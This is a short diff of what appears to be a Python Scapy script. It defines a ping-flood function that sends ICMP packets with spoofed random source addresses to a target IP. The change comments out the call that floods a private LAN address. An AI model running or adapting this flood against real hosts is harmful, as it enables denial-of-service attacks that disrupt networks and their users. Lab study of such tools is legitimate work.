@@ -7,4 +7,4 @@ def PING_Flood(targetIP, numPackets):
         send(IP(dst=targetIP, src=randomIP())/ICMP(), verbose=0)
         numPackets = numPackets - 1
 
-PING_Flood('192.168.1.220', 10000)
+#PING_Flood('192.168.1.220', 3000)
